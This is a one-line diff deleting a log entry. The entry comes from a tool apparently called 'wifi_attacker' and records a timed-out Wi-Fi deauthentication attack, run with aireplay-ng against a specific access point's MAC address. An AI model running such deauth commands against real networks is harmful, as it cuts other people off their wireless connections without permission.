@@ -1,1 +1,0 @@
-2025-09-23 11:01:04,944 - wifi_attacker - ERROR - Deauth attack error: Command '['sudo', 'aireplay-ng', '-0', '10', '-a', '04:02:1F:CD:4C:86', 'wlan0mon']' timed out after 30 seconds
